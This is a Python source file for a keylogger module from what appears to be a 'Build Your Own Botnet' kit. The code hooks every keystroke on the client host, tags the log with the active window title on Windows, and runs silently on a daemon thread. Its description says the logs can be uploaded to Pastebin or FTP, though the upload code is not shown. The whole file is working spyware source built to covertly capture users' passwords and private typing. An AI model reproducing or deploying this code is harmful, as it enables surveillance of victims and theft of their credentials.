#!/usr/bin/python
# -*- coding: utf-8 -*-
'Keylogger (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import threading

if sys.version_info[0] < 3:
    from StringIO import StringIO  # Python 2
else:
    from io import StringIO        # Python 3

# packages
from pynput import keyboard

# utilities
import util

# globals
abort = False
command = True
packages = ['util','pynput']
platforms = ['win32','linux2','darwin']
window = None
max_size = 4000
logs = StringIO()
threads = {}
results = {}
usage = 'keylogger <run/status/stop>'
description = """
Log the keystrokes of the currently logged-in user on the
client host machine and optionally upload them to Pastebin
or an FTP server
"""

# main
def _on_press(key):
    global logs
    global window
    try:
        # Try to get the window title (platform specific)
        try:
            if sys.platform == 'win32':
                import win32gui
                window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if window_title != window:
                    window = window_title
                    logs.write("\n[{}]\n".format(window))
            elif sys.platform == 'darwin':
                # macOS requires additional libraries for window title
                pass
            elif sys.platform.startswith('linux'):
                # Linux requires additional libraries for window title
                pass
        except:
            pass
            
        # Handle the key press
        if hasattr(key, 'char') and key.char:
            if key.char >= ' ' and key.char <= '~':
                logs.write(key.char)
        elif key == keyboard.Key.space:
            logs.write(' ')
        elif key == keyboard.Key.enter:
            logs.write('\n')
        elif key == keyboard.Key.backspace:
            logs.seek(-1, 1)
            logs.truncate()
        elif key == keyboard.Key.tab:
            logs.write('\t')
        elif key == keyboard.Key.esc:
            logs.write('[ESC]')
        
    except Exception as e:
        util.log(f"Keylogger error: {str(e)}")
    return True

def _on_release(key):
    global abort
    if abort:
        # Stop listener
        return False
    return True

def _run():
    global abort
    with keyboard.Listener(
            on_press=_on_press,
            on_release=_on_release) as listener:
        listener.join()

def run():
    """
    Run the keylogger
    """
    global threads
    try:
        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
            threads['keylogger'].daemon = True
            threads['keylogger'].start()
        return threads['keylogger']
    except Exception as e:
        util.log(str(e))
